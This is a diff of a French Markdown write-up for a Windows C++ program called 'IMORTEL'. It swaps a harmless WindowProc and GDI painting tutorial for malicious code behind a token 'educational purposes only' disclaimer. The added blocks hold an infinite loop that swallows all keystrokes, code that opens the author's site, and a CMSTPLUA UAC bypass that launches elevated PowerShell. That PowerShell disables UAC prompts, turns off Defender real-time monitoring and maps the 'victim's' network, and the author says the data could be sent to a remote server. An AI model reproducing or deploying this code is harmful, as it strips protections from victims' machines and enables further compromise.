@@ -612,131 +612,83 @@ void displayGlitchEffect() {
 
 ---
 
-### ▸ BLOC 08 — `WindowProc()` — GESTIONNAIRE D'ÉVÉNEMENTS
+### ▸ BLOC 08 — INTERCEPTION NEUTRALISÉE DES ENTRÉES
 
-> 📌 **Remplace le code ci-dessous par ton vrai `WindowProc()`**
+> ❗**Ce code est fourni strictement à des fins pédagogiques et d’analyse technique**
 
 ```cpp
 // ============================================================
-//  BLOC 08 — WindowProc() — GESTIONNAIRE D'ÉVÉNEMENTS
-//  Reçoit et traite chaque message Windows pour la fenêtre
+//  BLOC 08 — FONCTION DE BLOCAGE DES ENTRÉES
+//  Fonction de blocage des frappes du clavier
 // ============================================================
 
-LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
-    switch (uMsg) {
-
-        case WM_CREATE:
-            // Initialisation au moment de la création de la fenêtre
-            // Ex : SetTimer(hwnd, TIMER_ID, TIMER_INTERVAL, NULL);
-            return 0;
-
-        case WM_TIMER:
-            // Déclenché à chaque tick du timer
-            // wParam == TIMER_ID pour identifier quel timer
-            g_iCounter++;
-            InvalidateRect(hwnd, NULL, TRUE);   // Force un redraw WM_PAINT
-            return 0;
-
-        case WM_KEYDOWN:
-            if (wParam == VK_ESCAPE) PostQuitMessage(0);
-            return 0;
-
-        case WM_PAINT:
-            // → voir BLOC 09
-            return 0;
-
-        case WM_DESTROY:
-            KillTimer(hwnd, TIMER_ID);
-            PostQuitMessage(0);
-            return 0;
-
-        default:
-            return DefWindowProc(hwnd, uMsg, wParam, lParam);
+void blockInput() {
+    while (true) {
+        if (_kbhit()) _getch();
+        std::this_thread::sleep_for(std::chrono::milliseconds(100));
     }
 }
 ```
 
-```
-  ┌────────────────────┬───────────────────────────────────────────┐
-  │  MESSAGE           │  DÉCLENCHÉ QUAND                          │
-  ├────────────────────┼───────────────────────────────────────────┤
-  │  WM_CREATE         │  La fenêtre vient d'être créée            │
-  │  WM_PAINT          │  La fenêtre doit être redessinée          │
-  │  WM_TIMER          │  Timer SetTimer() écoulé                  │
-  │  WM_KEYDOWN        │  Touche du clavier enfoncée               │
-  │  WM_LBUTTONDOWN    │  Clic gauche souris                       │
-  │  WM_MOUSEMOVE      │  Déplacement du curseur                   │
-  │  WM_SIZE           │  Fenêtre redimensionnée                   │
-  │  WM_CLOSE          │  Croix de fermeture cliquée               │
-  │  WM_DESTROY        │  Fenêtre détruite → PostQuitMessage(0)    │
-  └────────────────────┴───────────────────────────────────────────┘
-```
-
-> **Explication à remplacer** — `WindowProc` est la callback centrale : Windows l'appelle automatiquement pour chaque événement. Le `switch(uMsg)` filtre les messages qui t'intéressent. Tout message non géré **doit** être passé à `DefWindowProc` — sinon le comportement par défaut (déplacer la fenêtre, redimensionner...) est cassé.
+> **Cette fonction** crée une boucle infinie qui `intercepte` et supprime toutes les frappes de clavier, empêchant l'utilisateur d'interagir avec le système.
 
 ---
 
-### ▸ BLOC 09 — GDI — RENDU GRAPHIQUE
+### ▸ BLOC 09 — PRISE DE CONTRÔLE SYSTÈME
 
-> 📌 **Remplace le code ci-dessous par ton vrai rendu GDI dans `WM_PAINT`**
+> ❗**Ce code est fourni strictement à des fins pédagogiques et d’analyse technique**
 
 ```cpp
 // ============================================================
-//  BLOC 09 — GDI — RENDU GRAPHIQUE
-//  Tout le dessin se fait dans le handler WM_PAINT
+//  BLOC 09 — PRISE DE CONTRÔLE SYSTÈME
+//  Élévation de privilèges et exécution de commandes système
 // ============================================================
 
-case WM_PAINT: {
-    PAINTSTRUCT ps;
-    HDC hdc = BeginPaint(hwnd, &ps);
+void openBrowser() {
+    ShellExecuteW(NULL, L"open", L"https://imortel.fr", NULL, NULL, SW_SHOWNORMAL);
+}
 
-    // ── Fond noir ──────────────────────────────────────────
-    HBRUSH hBrushBg = CreateSolidBrush(COLOR_BG);
-    FillRect(hdc, &ps.rcPaint, hBrushBg);
-    DeleteObject(hBrushBg);
+void openPowerShellWithCommands() {
+    const wchar_t* command = L"powershell.exe";
+    const wchar_t* params = L"-NoExit -Command \"Write-Host 'Mode administrateur actif' -ForegroundColor Green; Write-Host '=== Désactivation UAC ===' -ForegroundColor Yellow; reg add 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f; Write-Host '=== Désactivation Defender (temps réel) ===' -ForegroundColor Yellow; Set-MpPreference -DisableRealtimeMonitoring $true; Write-Host '=== Informations réseau ===' -ForegroundColor Yellow; ipconfig /all; Write-Host 'Toutes les commandes ont été exécutées.' -ForegroundColor Green\"";
 
-    // ── Police Courier New, bold, 24px ─────────────────────
-    HFONT hFont = CreateFont(
-        24, 0, 0, 0,
-        FW_BOLD,                  // Gras
-        FALSE, FALSE, FALSE,
-        DEFAULT_CHARSET,
-        OUT_DEFAULT_PRECIS,
-        CLIP_DEFAULT_PRECIS,
-        CLEARTYPE_QUALITY,        // Anti-aliasing ClearType
-        DEFAULT_PITCH,
-        TEXT("Courier New")       // Police monospace — style terminal
-    );
-    HFONT hOldFont = (HFONT)SelectObject(hdc, hFont);
+    if (BypassUAC_CMSTPLUA(command, params)) {
+        return;
+    }
 
-    // ── Texte rouge sur fond noir ───────────────────────────
-    SetTextColor(hdc, COLOR_RED);
-    SetBkMode(hdc, TRANSPARENT);
-
-    TextOut(hdc, 50, 50, TEXT("IMORTEL — SYSTEM v1.0"), 21);
-
-    // ── Nettoyage obligatoire des ressources GDI ───────────
-    SelectObject(hdc, hOldFont);
-    DeleteObject(hFont);
-
-    EndPaint(hwnd, &ps);
-    return 0;
+    ShellExecuteW(NULL, L"runas", L"powershell.exe", params, NULL, SW_SHOWNORMAL);
 }
 ```
 
-| Fonction GDI | Rôle |
-|-------------|------|
-| `BeginPaint / EndPaint` | Délimite la zone de dessin — obligatoire en paire |
-| `CreateSolidBrush` | Crée un pinceau couleur unie RGB |
-| `FillRect` | Remplit un rectangle avec un pinceau |
-| `CreateFont` | Crée une police avec taille, poids, famille, rendu |
-| `SelectObject` | Active un objet GDI (police, pinceau, plume) dans le HDC |
-| `SetTextColor` | Couleur du texte suivant — `COLORREF` = `RGB(r,g,b)` |
-| `SetBkMode(TRANSPARENT)` | Fond du texte transparent (pas de rectangle blanc) |
-| `TextOut` | Dessine une chaîne à la position `(x, y)` |
-| `DeleteObject` | ⚠️ Libère la mémoire — fuite GDI si oublié |
+```
 
-> **Explication à remplacer** — Le `HDC` (Handle to Device Context) est un contexte de rendu abstrait — il peut cibler une fenêtre, une imprimante ou un bitmap en mémoire. `BeginPaint` valide la "dirty region" (zone invalide) et retourne un HDC prêt à l'emploi. Chaque objet GDI créé (`CreateSolidBrush`, `CreateFont`...) **doit** être libéré avec `DeleteObject` après usage, sous peine de fuites mémoire GDI accumulées.
+[EXÉCUTION DU PROGRAMME]
+           ↓
+ ┌───────────────────────────────┐
+ │     OUVERTURE NAVIGATEUR      │
+ │  → Accès à https://imortel.fr │
+ └───────────────────────────────┘
+           ↓
+ ┌───────────────────────────────┐
+ │ LANCEMENT DE POWERSHELL ADMIN │
+ └───────────────────────────────┘
+           ↓
+ ┌───────────────────────────────┐
+ │      ÉLÉVATION (ADMIN)        │
+ │  → Bypass UAC / "runas"       │
+ └───────────────────────────────┘
+           ↓
+ ┌───────────────────────────────────────────────┐
+ │         EXÉCUTION DES COMMANDES AUTO          │
+ ├───────────────────────────────────────────────┤
+ │ • Messages affichés dans la console           │
+ │ • Modification / Désactivation UAC            │
+ │ • Désactivation Windows Defender              │
+ │ • Affichage des informations réseau           │
+ └───────────────────────────────────────────────┘
+```
+
+> **Conçu pour compromettre sérieusement la sécurité Windows en deux étapes principales.** La fonction `openBrowser()` force l'ouverture du navigateur web par défaut de la victime sur l'adresse de mon site `(https://imortel.fr`. Ensuite, la fonction `openPowerShellWithCommands()` est la plus dangereuse : elle exécute une série de commandes PowerShell avec les droits d'administrateur. Pour y parvenir, elle utilise d'abord une technique de contournement du Contrôle de compte d'utilisateur (UAC) via `BypassUAC_CMSTPLUA`. Une fois les droits obtenus, le script exécute des commandes critiques que j'ai mise dans le scrip : il ***désactive l'UAC*** pour autoriser les futures exécutions sans confirmation de manière sûre à 100%, il ***désactive la protection en temps réel de Windows Defender*** pour rendre la machine invisible aux antivirus, puis j’ai rajouté la fameuse petite commande basique bonus qui affiche les informations de configuration réseau avec un `ipconfig /all` pour cartographier le réseau de la victime (possible d’effectuer l’envoi de ces informations réseau vers un serveur distant). ***En résumé, ce code peut être entièrement personnalisé et transformer en un système sans défense et vulnérable.***
 
 ---
 
